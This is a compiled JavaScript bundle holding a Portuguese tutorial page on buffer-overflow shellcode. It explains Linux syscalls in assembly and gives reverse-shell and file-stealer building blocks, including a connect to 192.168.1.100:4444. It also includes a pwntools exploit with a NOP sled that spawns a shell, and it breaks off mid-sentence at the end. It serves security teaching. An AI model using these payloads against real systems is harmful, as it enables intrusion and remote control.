"use strict";(globalThis.webpackChunkmanual_pwning_docs=globalThis.webpackChunkmanual_pwning_docs||[]).push([[10],{8024(e,r,s){s.r(r),s.d(r,{assets:()=>c,contentTitle:()=>d,default:()=>m,frontMatter:()=>l,metadata:()=>n,toc:()=>i});const n=JSON.parse('{"id":"pwning/bof/2-3-bof-shellcode","title":"Buffer Overflow - Shellcode","description":"Shellcode \xe9 um pequeno trecho de c\xf3digo em Assembly usado como payload (carga \xfatil) em um ataque. O c\xf3digo \xe9 muito pequeno por ser em assembly, portanto apenas poucos bytes s\xe3o necess\xe1rios, dependendo do shellcode.","source":"@site/docs/pwning/bof/2-3-bof-shellcode.md","sourceDirName":"pwning/bof","slug":"/pwning/bof/2-3-bof-shellcode","permalink":"/manual-pwning/docs/pwning/bof/2-3-bof-shellcode","draft":false,"unlisted":false,"tags":[],"version":"current","frontMatter":{"title":"Buffer Overflow - Shellcode"},"sidebar":"tutorialSidebar","previous":{"title":"Buffer Overflow - Return Address","permalink":"/manual-pwning/docs/pwning/bof/2-2-bof-callfunction"},"next":{"title":"Format Strings","permalink":"/manual-pwning/docs/pwning/format-strings"}}');var a=s(4848),o=s(8453);const l={title:"Buffer Overflow - Shellcode"},d=void 0,c={},i=[{value:"O que colocar no shellcode?",id:"o-que-colocar-no-shellcode",level:2},{value:"Syscalls",id:"syscalls",level:2},{value:"execve - Executar Shell/programa",id:"execve---executar-shellprograma",level:3},{value:"File Descriptors (fd)",id:"file-descriptors-fd",level:3},{value:"write - Sa\xedda/Escrita",id:"write---sa\xeddaescrita",level:3},{value:"read - Entrada/Leitura",id:"read---entradaleitura",level:3},{value:"open - Abrir arquivos",id:"open---abrir-arquivos",level:3},{value:"exit - Sa\xedda controlada",id:"exit---sa\xedda-controlada",level:3},{value:"dup2 - Redirecionamento",id:"dup2---redirecionamento",level:3},{value:"socket + connect - Reverse Shell",id:"socket--connect---reverse-shell",level:3},{value:"Combina\xe7\xf5es de Syscalls",id:"combina\xe7\xf5es-de-syscalls",level:3},{value:"Outras Syscalls",id:"outras-syscalls",level:3},{value:"NOPs",id:"nops",level:2},{value:"Criando um Shellcode",id:"criando-um-shellcode",level:2},{value:"ShellCode + pwntools",id:"shellcode--pwntools",level:2},{value:"Sum\xe1rio de uso BOF Shellcode",id:"sum\xe1rio-de-uso-bof-shellcode",level:2}];function t(e){const r={a:"a",code:"code",h2:"h2",h3:"h3",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,o.R)(),...e.components};return(0,a.jsxs)(a.Fragment,{children:[(0,a.jsxs)(r.p,{children:["Shellcode \xe9 um ",(0,a.jsx)(r.strong,{children:"pequeno trecho de c\xf3digo em Assembly usado como payload (carga \xfatil) em um ataque"}),". O c\xf3digo \xe9 muito pequeno por ser em assembly, portanto apenas poucos bytes s\xe3o necess\xe1rios, dependendo do shellcode."]}),"\n",(0,a.jsxs)(r.p,{children:["Com shellcode, ",(0,a.jsx)(r.strong,{children:"fazemos o programa rodar funcionalidades que o programador n\xe3o escreveu"}),". Normalmente, shellcode \xe9 utilizado para fazer uma chamada de API do Windows ou Syscall no Linux."]}),"\n",(0,a.jsx)(r.p,{children:"No C, estar\xedamos fazendo algo como:"}),"\n",(0,a.jsx)(r.pre,{children:(0,a.jsx)(r.code,{className:"language-C",children:'int main() {\r\n    system("/bin/sh"); // Chama shell\r\n    return 0;\r\n}\n'})}),"\n",(0,a.jsxs)(r.p,{children:["O Shellcode \xe9 a vers\xe3o compacta disso, em assembly, que pode ser injetada na mem\xf3ria atrav\xe9s de um input. Ou seja, ",(0,a.jsx)(r.strong,{children:"Shellcode \xe9 c\xf3digo Assembly normal"}),", nada especial. \xc9 chamado de shellcode pois geralmente envolve abrir uma shell (interface entre usu\xe1rio e servi\xe7os do sistema operacional, algo como o prompt de comando do Windows)."]}),"\n",(0,a.jsxs)(r.p,{children:["A raz\xe3o pela qual Shellcode funciona \xe9 por que ",(0,a.jsx)(r.strong,{children:"o computador n\xe3o diferencia dados e instru\xe7\xf5es"}),". N\xe3o importa onde ou como voc\xea fala para rodar, o computador VAI tentar rodar. Assim, colocamos o shellcode na Stack e falamos para a ",(0,a.jsx)(r.code,{children:"RIP"})," executar aquilo."]}),"\n",(0,a.jsx)(r.h2,{id:"o-que-colocar-no-shellcode",children:"O que colocar no shellcode?"}),"\n",(0,a.jsx)(r.p,{children:"Podemos escrever v\xe1rias coisas em assembly que s\xe3o \xfateis como c\xf3digo injet\xe1vel. Entre elas, temos:"}),"\n",(0,a.jsxs)(r.ol,{children:["\n",(0,a.jsxs)(r.li,{children:[(0,a.jsx)(r.strong,{children:"Syscall (Linux/Unix)"})," - O mais comum. Fazemos chamadas diretas ao kernel via instru\xe7\xe3o ",(0,a.jsx)(r.code,{children:"syscall / int 0x80"}),". \xc9 simples, n\xe3o depende de bibliotecas espec\xedficas e permite acessar todas as funcionalidades do Kernel."]}),"\n",(0,a.jsxs)(r.li,{children:[(0,a.jsx)(r.strong,{children:(0,a.jsx)(r.a,{href:"/docs/pwning/rop/8-1-rop",children:"ROP (Return-Oriented Programming)"})})," - Reutilizar c\xf3digos do pr\xf3prio programa encadeados para a\xe7\xe3o maliciosa"]}),"\n",(0,a.jsxs)(r.li,{children:[(0,a.jsx)(r.strong,{children:"Chamada de API Windows"})," - Usamos as APIs do SO Windows ao inv\xe9s de syscalls, pois as syscalls do Windows n\xe3o s\xe3o p\xfablicas."]}),"\n",(0,a.jsxs)(r.li,{children:[(0,a.jsx)(r.strong,{children:"Explora\xe7\xe3o de Browser"})," - JavaScript/WebAssembly que explora vulnerabilidades no renderizador. Tende a ser bem complexo, pois explora bugs no motor do JS."]}),"\n"]}),"\n",(0,a.jsxs)(r.p,{children:["Iremos focar em ",(0,a.jsx)(r.strong,{children:"Syscalls"})," e ",(0,a.jsx)(r.strong,{children:"ROP"}),"."]}),"\n",(0,a.jsx)(r.h2,{id:"syscalls",children:"Syscalls"}),"\n",(0,a.jsxs)(r.p,{children:["Syscalls s\xe3o interfaces de f\xe1cil uso que ",(0,a.jsx)(r.strong,{children:"permitem que programas solicitem servi\xe7os do kernel do sistema operacional"}),", como ",(0,a.jsx)(r.strong,{children:"acesso a hardware"}),", ",(0,a.jsx)(r.strong,{children:"cria\xe7\xe3o de processos"}),", ",(0,a.jsx)(r.strong,{children:"gerenciamento de arquivos"}),", etc. Para fazer uma syscall damos o ",(0,a.jsx)(r.strong,{children:"n\xfamero da syscall"})," (opera\xe7\xe3o que queremos), os ",(0,a.jsx)(r.strong,{children:"argumentos"})," e em seguida usamos o ",(0,a.jsx)(r.strong,{children:"comando syscall (x64) / int 0x80 (x86)"}),", como vemos abaixo."]}),"\n",(0,a.jsx)(r.pre,{children:(0,a.jsx)(r.code,{children:";x86-64\r\n\r\nmov rax, syscall_number  ; N\xfamero da syscall\r\nmov rdi, arg1            ; Primeiro argumento\r\nmov rsi, arg2            ; Segundo argumento\r\nmov rdx, arg3            ; Terceiro argumento\r\nmov r10, rcx             ; Quarto argumento (rcx n\xe3o usado)\r\nmov r8, r8               ; Quinto argumento\r\nmov r9, r9               ; Sexto argumento\r\nsyscall                  ; Instru\xe7\xe3o para chamar o kernel\r\n\r\n; x86\r\n\r\nmov eax, syscall_number  ; N\xfamero da syscall\r\nmov ebx, arg1            ; Primeiro argumento\r\nmov ecx, arg2            ; Segundo argumento\r\nmov edx, arg3            ; Terceiro argumento\r\nint 0x80                 ; Interrup\xe7\xe3o para chamar o kernel\n"})}),"\n",(0,a.jsx)(r.p,{children:"Vamos falar de algumas syscalls importantes."}),"\n",(0,a.jsx)(r.h3,{id:"execve---executar-shellprograma",children:"execve - Executar Shell/programa"}),"\n",(0,a.jsx)(r.p,{children:"C\xf3digo para cada arquitetura:"}),"\n",(0,a.jsxs)(r.ul,{children:["\n",(0,a.jsxs)(r.li,{children:[(0,a.jsx)(r.code,{children:"x86"})," - 11"]}),"\n",(0,a.jsxs)(r.li,{children:[(0,a.jsx)(r.code,{children:"x64"})," - 59"]}),"\n"]}),"\n",(0,a.jsx)(r.pre,{children:(0,a.jsx)(r.code,{className:"language-nasm",children:"; Executa /bin/sh\r\nmov rax, 59           ; syscall n\xfamero 59 = execve\r\nlea rdi, [rel bin_sh] ; arg1: pathname = \"/bin/sh\"\r\nxor rsi, rsi          ; arg2: argv = NULL\r\nxor rdx, rdx          ; arg3: envp = NULL\r\nsyscall\r\n\r\nbin_sh: db '/bin/sh',0       ;(mude o caminho para executar outros programas)\n"})}),"\n",(0,a.jsx)(r.p,{children:"Exemplo:"}),"\n",(0,a.jsx)(r.pre,{children:(0,a.jsx)(r.code,{className:"language-nasm",children:"section .data\r\n    path db '/bin/ls', 0\r\n    arg0 db '/bin/ls', 0\r\n    arg1 db '-l', 0\r\n    args dq arg0, arg1, 0  ; Array de argumentos\r\n\r\nsection .text\r\nglobal _start\r\n_start:\r\n    mov rax, 59        ; execve syscall\r\n    lea rdi, [path]    ; caminho do programa\r\n    lea rsi, [args]    ; argumentos\r\n    xor rdx, rdx       ; envp = NULL\r\n    syscall\n"})}),"\n",(0,a.jsx)(r.h3,{id:"file-descriptors-fd",children:"File Descriptors (fd)"}),"\n",(0,a.jsx)(r.p,{children:"File Descriptor \xe9 um n\xfamero que representa um arquivo aberto. STDIN, STDOUT, STDERR s\xe3o padr\xf5es do sistema, e os fd's de arquivos e sockets s\xe3o atribu\xeddos conforme necessidade."}),"\n",(0,a.jsxs)(r.ul,{children:["\n",(0,a.jsxs)(r.li,{children:[(0,a.jsx)(r.code,{children:"STDIN (0)"}),"  \u2192 Para RECEBER coisas. Normalmente teclado."]}),"\n",(0,a.jsxs)(r.li,{children:[(0,a.jsx)(r.code,{children:"STDOUT (1)"})," \u2192 Para ENVIAR coisas. Normalmente tela/monitor."]}),"\n",(0,a.jsxs)(r.li,{children:[(0,a.jsx)(r.code,{children:"STDERR (2)"})," \u2192 Para RECLAMAR de erros. Normalmente tela/monitor."]}),"\n",(0,a.jsxs)(r.li,{children:[(0,a.jsx)(r.code,{children:"Arquivo (X)"})," \u2192 Para arquivo espec\xedfico criado."]}),"\n",(0,a.jsxs)(r.li,{children:[(0,a.jsx)(r.code,{children:"Socket (X)"})," \u2192 Para socket criado que permite se comunicar pela internet."]}),"\n"]}),"\n",(0,a.jsx)(r.h3,{id:"write---sa\xeddaescrita",children:"write - Sa\xedda/Escrita"}),"\n",(0,a.jsx)(r.p,{children:"C\xf3digo para cada arquitetura:"}),"\n",(0,a.jsxs)(r.ul,{children:["\n",(0,a.jsxs)(r.li,{children:[(0,a.jsx)(r.code,{children:"x86"})," - 4"]}),"\n",(0,a.jsxs)(r.li,{children:[(0,a.jsx)(r.code,{children:"x64"})," - 1"]}),"\n"]}),"\n",(0,a.jsx)(r.pre,{children:(0,a.jsx)(r.code,{className:"language-nasm",children:"; Escreve em arquivo/socket\r\nmov rax, 1       ; write\r\nmov rdi, 1       ; fd (1=stdout, 4=socket)\r\nlea rsi, [msg]   ; buffer\r\nmov rdx, len     ; tamanho\r\nsyscall\n"})}),"\n",(0,a.jsx)(r.p,{children:"Exemplo:"}),"\n",(0,a.jsx)(r.pre,{children:(0,a.jsx)(r.code,{className:"language-nasm",children:"; write(\"Hello\\n\", 6)\r\nmov rax, 1       ; syscall 1 = write\r\nmov rdi, 1       ; fd = STDOUT\r\nmov rsi, hello   ; string\r\nmov rdx, 6       ; length\r\nsyscall          ; chamada\r\n\r\nhello: db 'Hello', 0x0a\n"})}),"\n",(0,a.jsx)(r.h3,{id:"read---entradaleitura",children:"read - Entrada/Leitura"}),"\n",(0,a.jsx)(r.p,{children:"C\xf3digo para cada arquitetura:"}),"\n",(0,a.jsxs)(r.ul,{children:["\n",(0,a.jsxs)(r.li,{children:[(0,a.jsx)(r.code,{children:"x86"})," - 3"]}),"\n",(0,a.jsxs)(r.li,{children:[(0,a.jsx)(r.code,{children:"x64"})," - 0"]}),"\n"]}),"\n",(0,a.jsx)(r.pre,{children:(0,a.jsx)(r.code,{className:"language-nasm",children:"; L\xea de entrada/socket\r\nmov rax, 0       ; read\r\nmov rdi, 0       ; fd (0=stdin, 4=socket)\r\nlea rsi, [buf]   ; buffer\r\nmov rdx, 1024    ; tamanho m\xe1ximo\r\nsyscall\n"})}),"\n",(0,a.jsx)(r.p,{children:"Exemplo:"}),"\n",(0,a.jsx)(r.pre,{children:(0,a.jsx)(r.code,{className:"language-nasm",children:"section .bss\r\n    buffer resb 100    ; Reserva 100 bytes\r\n\r\nsection .text\r\nglobal _start\r\n_start:\r\n    mov rax, 0         ; read syscall\r\n    mov rdi, 0         ; fd 0 = stdin (teclado)\r\n    lea rsi, [buffer]  ; onde guardar\r\n    mov rdx, 100       ; ler at\xe9 100 bytes\r\n    syscall\r\n    \r\n    ; Agora [buffer] tem o que usu\xe1rio digitou\n"})}),"\n",(0,a.jsx)(r.h3,{id:"open---abrir-arquivos",children:"open - Abrir arquivos"}),"\n",(0,a.jsx)(r.p,{children:"C\xf3digo para cada arquitetura:"}),"\n",(0,a.jsxs)(r.ul,{children:["\n",(0,a.jsxs)(r.li,{children:[(0,a.jsx)(r.code,{children:"x86"})," - 5"]}),"\n",(0,a.jsxs)(r.li,{children:[(0,a.jsx)(r.code,{children:"x64"})," - 2"]}),"\n"]}),"\n",(0,a.jsx)(r.pre,{children:(0,a.jsx)(r.code,{className:"language-nasm",children:"; Abre arquivo\r\nmov rax, 2       ; open\r\nlea rdi, [path]  ; caminho\r\nxor rsi, rsi     ; flags=O_RDONLY\r\nsyscall\r\nmov [file_fd], rax\n"})}),"\n",(0,a.jsx)(r.p,{children:"Exemplo:"}),"\n",(0,a.jsx)(r.pre,{children:(0,a.jsx)(r.code,{className:"language-nasm",children:"section .data\r\n    filename db '/etc/passwd', 0\r\n\r\nsection .text\r\nglobal _start\r\n_start:\r\n    mov rax, 2         ; open syscall\r\n    lea rdi, [filename]; nome do arquivo\r\n    mov rsi, 0         ; O_RDONLY = apenas leitura\r\n    syscall            ; retorna fd em rax\r\n    mov rbx, rax       ; Salvar fd em rbx, pois rax ser\xe1 sobrescrito\r\n    \r\n    ; rbx cont\xe9m agora o file descriptor (n\xfamero do arquivo), que pode ser utilizado em outras fun\xe7\xf5es\n"})}),"\n",(0,a.jsx)(r.h3,{id:"exit---sa\xedda-controlada",children:"exit - Sa\xedda controlada"}),"\n",(0,a.jsx)(r.p,{children:"C\xf3digo para cada arquitetura:"}),"\n",(0,a.jsxs)(r.ul,{children:["\n",(0,a.jsxs)(r.li,{children:[(0,a.jsx)(r.code,{children:"x86"})," - 1"]}),"\n",(0,a.jsxs)(r.li,{children:[(0,a.jsx)(r.code,{children:"x64"})," - 60"]}),"\n"]}),"\n",(0,a.jsx)(r.pre,{children:(0,a.jsx)(r.code,{className:"language-nasm",children:"; Sai sem crash\r\nmov rax, 60      ; exit\r\nmov rdi, 0     ; status=0 (sucesso)\r\nsyscall\n"})}),"\n",(0,a.jsx)(r.h3,{id:"dup2---redirecionamento",children:"dup2 - Redirecionamento"}),"\n",(0,a.jsxs)(r.p,{children:["O dup2 redireciona entrada/sa\xedda. Se fazemos ",(0,a.jsx)(r.code,{children:"dup2(socket_fd, 1)"}),', isso \xe9 igual a dizer: "Quando o programa escrever na tela (1), na verdade escreva no socket (socket_fd)".']}),"\n",(0,a.jsx)(r.p,{children:"C\xf3digo para cada arquitetura:"}),"\n",(0,a.jsxs)(r.ul,{children:["\n",(0,a.jsxs)(r.li,{children:[(0,a.jsx)(r.code,{children:"x86"})," - 63"]}),"\n",(0,a.jsxs)(r.li,{children:[(0,a.jsx)(r.code,{children:"x64"})," - 33"]}),"\n"]}),"\n",(0,a.jsx)(r.pre,{children:(0,a.jsx)(r.code,{className:"language-nasm",children:"; Redireciona fd para outro\r\nmov rax, 33      ; dup2(old_fd, new_fd)\r\nmov rdi, rbx       ; socket fd criado\r\nmov rsi, 0       ; STDIN\r\nsyscall\n"})}),"\n",(0,a.jsx)(r.h3,{id:"socket--connect---reverse-shell",children:"socket + connect - Reverse Shell"}),"\n",(0,a.jsxs)(r.p,{children:["Imagine a internet como um sistema postal. Criar um ",(0,a.jsx)(r.code,{children:"socket"}),' \xe9 criar um "envelope" para a sua carta.']}),"\n",(0,a.jsx)(r.pre,{children:(0,a.jsx)(r.code,{className:"language-nasm",children:'mov rax, 41        ; syscalkl 41 = socket\r\nmov rdi, 2         ; "Quero um envelope para carta normal" (AF_INET = internet)\r\nmov rsi, 1         ; "Com entrega garantida" (SOCK_STREAM = TCP)\r\nmov rdx, 0         ; "M\xe9todo padr\xe3o de entrega"\r\nsyscall            ; Retorna: "Aqui est\xe1 seu envelope n\xfamero X salvo em rax"\r\nmov rbx, rax       ; Salva n\xfamero do socket e rbx, pois rax ser\xe1 sobrescrito\n'})}),"\n",(0,a.jsx)(r.p,{children:"C\xf3digo para cada arquitetura:"}),"\n",(0,a.jsxs)(r.ul,{children:["\n",(0,a.jsxs)(r.li,{children:["Socket ",(0,a.jsx)(r.code,{children:"x86"})," - 102"]}),"\n",(0,a.jsxs)(r.li,{children:["Socket ",(0,a.jsx)(r.code,{children:"x64"})," - 41"]}),"\n"]}),"\n",(0,a.jsxs)(r.p,{children:["Fazer ",(0,a.jsx)(r.code,{children:"connect"})," \xe9 como enviar essa carta."]}),"\n",(0,a.jsx)(r.pre,{children:(0,a.jsx)(r.code,{className:"language-nasm",children:'mov rax, 42        ; syscall 42 = connect\r\nmov rdi, rbx         ; "Usando este envelope n\xfamero X" (socket_fd criado antes)\r\nlea rsi, [endereco]; "Para este endere\xe7o espec\xedfico"\r\nmov rdx, 16        ; "Tamanho padr\xe3o de endere\xe7o"\r\nsyscall            ; *Correio pega a carta*\r\n\r\n; O endere\xe7o (struct sockaddr)\r\nsockaddr:\r\ndw 2                  ; Mandamos para a internet (AF_INET) - 2 bytes\r\ndw 0x5c11             ; Porta 4444 = 0x115c (network byte order) - 2 bytes\r\ndd 0xc0a80164         ; IP 192.168.1.100 = 0x64.0x01.0xa8.0xc0 - 4 bytes\r\ntimes 8 db 0          ; A struct precisa ter 16 bytes. Preenchemos 8 vezes o n\xfamero 0x0 (8 bytes de padding)\n'})}),"\n",(0,a.jsx)(r.p,{children:"C\xf3digo para cada arquitetura:"}),"\n",(0,a.jsxs)(r.ul,{children:["\n",(0,a.jsxs)(r.li,{children:["Connect ",(0,a.jsx)(r.code,{children:"x86"})," - 3"]}),"\n",(0,a.jsxs)(r.li,{children:["Connect ",(0,a.jsx)(r.code,{children:"x64"})," - 42"]}),"\n"]}),"\n",(0,a.jsxs)(r.p,{children:["Com ",(0,a.jsx)(r.code,{children:"socket"})," e ",(0,a.jsx)(r.code,{children:"connect"}),", estabelecemos uma conex\xe3o. Para enviar dados, por exemplo, temos que usar ",(0,a.jsx)(r.code,{children:"write"}),": ",(0,a.jsx)(r.code,{children:"write(socket_fd, [dados], tamanho)"})]}),"\n",(0,a.jsx)(r.h3,{id:"combina\xe7\xf5es-de-syscalls",children:"Combina\xe7\xf5es de Syscalls"}),"\n",(0,a.jsx)(r.p,{children:"Abrir Shell / Backdoor simples"}),"\n",(0,a.jsxs)(r.ol,{children:["\n",(0,a.jsx)(r.li,{children:"execve"}),"\n"]}),"\n",(0,a.jsx)(r.p,{children:"Reverse Shell"}),"\n",(0,a.jsxs)(r.ol,{children:["\n",(0,a.jsx)(r.li,{children:"socket() - cria socket"}),"\n",(0,a.jsx)(r.li,{children:"connect() - conecta ao atacante"}),"\n",(0,a.jsx)(r.li,{children:"dup2() - redireciona STDIN/OUT/ERR para socket"}),"\n",(0,a.jsx)(r.li,{children:"execve() - executa /bin/sh"}),"\n"]}),"\n",(0,a.jsx)(r.p,{children:"File Stealer"}),"\n",(0,a.jsxs)(r.ol,{children:["\n",(0,a.jsx)(r.li,{children:"open() - abre arquivo"}),"\n",(0,a.jsx)(r.li,{children:"read() - l\xea conte\xfado"}),"\n",(0,a.jsx)(r.li,{children:"write() - escreve para socket/arquivo"}),"\n"]}),"\n",(0,a.jsx)(r.h3,{id:"outras-syscalls",children:"Outras Syscalls"}),"\n",(0,a.jsxs)(r.p,{children:["Para ver cada syscall, seu c\xf3digo, par\xe2metros e o que faz, recomendo olhar a ",(0,a.jsx)(r.a,{href:"/docs/extra/syscall-tb",children:"Tabela de Syscalls para kernel Linux"}),"."]}),"\n",(0,a.jsx)(r.p,{children:"Outros materiais tamb\xe9m est\xe3o dispon\xedveis na internet:"}),"\n",(0,a.jsxs)(r.ul,{children:["\n",(0,a.jsx)(r.li,{children:(0,a.jsx)(r.a,{href:"https://www.ime.usp.br/~kon/MAC211/syscalls.html",children:"Tabela de Syscalls Linux x86 - IME USP"})}),"\n",(0,a.jsx)(r.li,{children:(0,a.jsx)(r.a,{href:"https://filippo.io/linux-syscall-table/",children:"Tabela de Syscalls Linux x86-64 - Fillipo"})}),"\n",(0,a.jsx)(r.li,{children:(0,a.jsx)(r.a,{href:"https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/",children:"Tabela de Syscalls Linux x86-64 - Rchapman"})}),"\n"]}),"\n",(0,a.jsx)(r.h2,{id:"nops",children:"NOPs"}),"\n",(0,a.jsxs)(r.p,{children:["NOP (no operation) \xe9 uma isntru\xe7\xe3o do assembly que faz exatamente o que parece: nada. Ela apenas roda a pr\xf3xima instru\xe7\xe3o. Isso \xe9 muito bom para shellcodes, pois nos permite ter uma grande margem de erro para acertar onde come\xe7a a execu\xe7\xe3o do shellcode. Em assembly a instru\xe7\xe3o \xe9 ",(0,a.jsx)(r.code,{children:"nop"}),", e em bytes, ",(0,a.jsx)(r.code,{children:"0x90"}),"."]}),"\n",(0,a.jsx)(r.p,{children:"Assim, se quisermos fazer um shellcode com NOPs de padding:"}),"\n",(0,a.jsx)(r.pre,{children:(0,a.jsx)(r.code,{className:"language-py",children:"from pwn import *\r\n\r\ncontext.binary = ELF('./program')\r\n\r\np = process()\r\n\r\npayload = b'\\x90' * 240                 # NOPs\r\npayload += asm(shellcraft.sh())         # shellcode\r\npayload = payload.ljust(312, b'A')      # Padding\r\npayload += p32(0xffffcfb4 + 120)        # endere\xe7o do buffer + metade da largura dos nops (margem de erro)\r\n\r\nlog.info(p.clean())\r\np.sendline(payload)\r\np.interactive()\n"})}),"\n",(0,a.jsxs)(r.p,{children:["Tome cuidado, pois NOPs podem ter um byte diferente em outras arquiteturas. Assim, voc\xea pode usar ",(0,a.jsx)(r.code,{children:"nop = asm(shellcraft.nop())"}),"."]}),"\n",(0,a.jsx)(r.h2,{id:"criando-um-shellcode",children:"Criando um Shellcode"}),"\n",(0,a.jsx)(r.p,{children:"Antes de criar o shellcode, vamos montar um programa para testar shellcode em C:"}),"\n",(0,a.jsx)(r.pre,{children:(0,a.jsx)(r.code,{className:"language-C",children:'void (*shellcode)() = "[insira seu shellcode aqui]";\r\n\r\nint main(void) {\r\n    (*shellcode)();\r\n    return 0;\r\n}\n'})}),"\n",(0,a.jsx)(r.p,{children:"Esse programa deve ser compilado com as flags:"}),"\n",(0,a.jsxs)(r.ul,{children:["\n",(0,a.jsxs)(r.li,{children:[(0,a.jsx)(r.code,{children:"-z execstack"})," - Torna a pilha (stack) execut\xe1vel no bin\xe1rio compilado. Permite executar shellcode (desativa NX/DEP)."]}),"\n",(0,a.jsxs)(r.li,{children:[(0,a.jsx)(r.code,{children:"-Wno-incompatible-pointer-types"})," - Desabilita o warning espec\xedfico sobre convers\xf5es de ponteiros incompat\xedveis, j\xe1 que estamos fazendo um macete para executar o shellcode."]}),"\n",(0,a.jsxs)(r.li,{children:[(0,a.jsx)(r.code,{children:"-m32"})," - Define arquitetura de 32-bit."]}),"\n"]}),"\n",(0,a.jsxs)(r.p,{children:["Assim, compilamos com: ",(0,a.jsx)(r.code,{children:"gcc testador.c -o testador -z execstack -Wno-incompatible-pointer-types -m32"})]}),"\n",(0,a.jsxs)(r.p,{children:["Agora vamos criar um Shellcode b\xe1sico em assembly que simula a fun\xe7\xe3o ",(0,a.jsx)(r.code,{children:"exit()"})," em C com o par\xe2metro ",(0,a.jsx)(r.code,{children:"10"})," (isso faz o programa encerrar mostrando o c\xf3digo de status ",(0,a.jsx)(r.code,{children:"10"}),"). Vamos salvar o programa como ",(0,a.jsx)(r.code,{children:"exit.asm"}),"."]}),"\n",(0,a.jsx)(r.pre,{children:(0,a.jsx)(r.code,{className:"language-nasm",children:"    section .text     ; Define que essa regi\xe3o do c\xf3digo \xe9 para as instru\xe7\xf5es\r\n    global _start     ; Define que o programa come\xe7a por _start\r\n\r\n_start:\r\n    mov eax, 1        ; eax ( c\xf3digo da syscall ) = 1 ( exit )\r\n    mov ebx, 10       ; ebx ( par\xe2metro da syscall ) = 10\r\n    int 0x80          ; Chama a syscall ( exit(10) )\n"})}),"\n",(0,a.jsxs)(r.p,{children:["Para compilarmos esse programa, usaremos o ",(0,a.jsx)(r.code,{children:"nasm"})," e para linkar o objeto montado pelo nasm, usaremos o ",(0,a.jsx)(r.code,{children:"ld"}),"."]}),"\n",(0,a.jsx)(r.pre,{children:(0,a.jsx)(r.code,{children:"nasm -f elf32 exit.asm -o exit.o\r\nld -m elf_i386 exit.o -o exit\n"})}),"\n",(0,a.jsxs)(r.p,{children:["Podemos executar o programa com ",(0,a.jsx)(r.code,{children:"./exit"})," e ver o c\xf3digo de sa\xedda do programa com ",(0,a.jsx)(r.code,{children:"echo $?"}),". Assim, vemos que o programa realmente encerra com o n\xfamero 10."]}),"\n",(0,a.jsxs)(r.p,{children:["O programa, ap\xf3s compilado, vira bytes em disco. ",(0,a.jsx)(r.strong,{children:"Esses bytes de instru\xe7\xe3o s\xe3o nosso shellcode"}),". Para pegar os bytes do programa em disco, usamos ",(0,a.jsx)(r.code,{children:"objdump -D exit"}),":"]}),"\n",(0,a.jsx)(r.pre,{children:(0,a.jsx)(r.code,{className:"language-bash",children:"exit:     file format elf32-i386\r\n\r\nDisassembly of section .text:\r\n\r\n08049000 <_start>:\r\n 8049000:       b8 01 00 00 00          mov    $0x1,%eax\r\n 8049005:       bb 0a 00 00 00          mov    $0xa,%ebx\r\n 804900a:       cd 80                   int    $0x80\n"})}),"\n",(0,a.jsx)(r.p,{children:"No meio temos os bytes, na direita as respectivas instru\xe7\xf5es. Portanto, os bytes do programa s\xe3o:"}),"\n",(0,a.jsx)(r.pre,{children:(0,a.jsx)(r.code,{children:"b8 01 00 00 00\r\nbb 0a 00 00 00\r\ncd 80\n"})}),"\n",(0,a.jsx)(r.p,{children:"Colocando eles no nosso testador:"}),"\n",(0,a.jsx)(r.pre,{children:(0,a.jsx)(r.code,{className:"language-c",children:'void (*shellcode)() = "\\xb8\\x01\\x00\\x00\\x00\\xbb\\x0a\\x00\\x00\\x00\\xcd\\x80";\r\n\r\nint main(void) {\r\n    (*shellcode)();\r\n    return 0;\r\n}\n'})}),"\n",(0,a.jsx)(r.p,{children:"Compilando e executando:"}),"\n",(0,a.jsx)(r.pre,{children:(0,a.jsx)(r.code,{className:"language-bash",children:"./testador\r\necho $?\n"})}),"\n",(0,a.jsx)(r.p,{children:"Podemos ver que o c\xf3digo de sa\xedda \xe9 10, como esperado."}),"\n",(0,a.jsx)(r.h2,{id:"shellcode--pwntools",children:"ShellCode + pwntools"}),"\n",(0,a.jsxs)(r.p,{children:["O pwntools possui a ferramenta ",(0,a.jsx)(r.code,{children:"shellcraft"}),", que tem shellcodes prontos para uso. ",(0,a.jsx)(r.strong,{children:"O shellcode dado vai estar em assembly"})," e ",(0,a.jsx)(r.strong,{children:"temos que transformar em bytes"})," usando a fun\xe7\xe3o ",(0,a.jsx)(r.code,{children:"asm()"}),"."]}),"\n",(0,a.jsxs)(r.p,{children:["O shellcraft possui in\xfameros shellcodes prontos. Se quiser, veja ",(0,a.jsx)(r.a,{href:"/docs/extra/shellcraft-li",children:"Principais Fun\xe7\xf5es Shellcraft"}),". Abaixo, temos alguns shellcodes populares."]}),"\n",(0,a.jsx)(r.pre,{children:(0,a.jsx)(r.code,{className:"language-py",children:"# Shellcodes prontos populares\r\nshellcraft.sh()           # /bin/sh (Chama shell)\r\nshellcraft.cat('file')    # cat file\r\nshellcraft.dupsh()        # Duplica shell para fd\r\nshellcraft.echo('text')   # Imprime texto\r\nshellcraft.exit()         # Sai do processo\n"})}),"\n",(0,a.jsxs)(r.p,{children:["Como exemplo vamos fazer o mesmo c\xf3digo que fizemos antes de ",(0,a.jsx)(r.code,{children:"exit(10)"}),", mas no pwntools."]}),"\n",(0,a.jsx)(r.pre,{children:(0,a.jsx)(r.code,{className:"language-py",children:'from pwn import *\r\n\r\n# Gerar shellcode\r\nshellcode = asm(shellcraft.exit(10))\r\n\r\n# Ver bytes\r\nprint(f"Shellcode: {len(shellcode)} bytes")\r\nprint(hexdump(shellcode))\r\n\r\n# Ver instru\xe7\xf5es\r\nprint("\\nInstru\xe7\xf5es Assembly:")\r\nprint(disasm(shellcode))\r\n\r\n# Executar (run_shellcode())\r\np = run_shellcode(shellcode)\r\np.interactive()\n'})}),"\n",(0,a.jsx)(r.h2,{id:"sum\xe1rio-de-uso-bof-shellcode",children:"Sum\xe1rio de uso BOF Shellcode"}),"\n",(0,a.jsx)(r.p,{children:"Basicamente:"}),"\n",(0,a.jsxs)(r.ol,{children:["\n",(0,a.jsx)(r.li,{children:"Identifique se \xe9 poss\xedvel fazer BOF"}),"\n",(0,a.jsxs)(r.li,{children:["Coloque o ",(0,a.jsx)(r.strong,{children:"Shellcode no Input"})," + ",(0,a.jsxs)(r.strong,{children:["Padding at\xe9 ",(0,a.jsx)(r.code,{children:"return address"})]})," + ",(0,a.jsx)(r.strong,{children:"Endere\xe7o do in\xedcio do Shellcode na stack"})]}),"\n",(0,a.jsxs)(r.li,{children:["Sim, 